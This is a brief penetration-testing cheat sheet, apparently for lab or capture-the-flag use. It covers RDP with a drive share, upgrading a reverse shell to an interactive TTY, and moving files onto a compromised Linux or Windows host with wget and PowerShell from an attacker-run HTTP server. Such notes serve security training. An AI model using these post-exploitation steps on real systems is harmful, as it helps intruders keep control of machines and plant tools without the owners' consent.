### RDP

For windows with share and 85% screen

```
rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.10.10.10
```








### Linux

binaries Path

```
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ucb/
```

###  Interactive Shell

Arrumando interactive TTY using Python

```shell
# Enter while in reverse shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo; fg


# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>

```




### File Transfer

#### HTTP

The most common le transfer method.

```shell
# In Kali
python -m SimpleHTTPServer 80

# In reverse shell - Linux
wget 10.10.10.10/file

# In reverse shell - Windows
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
```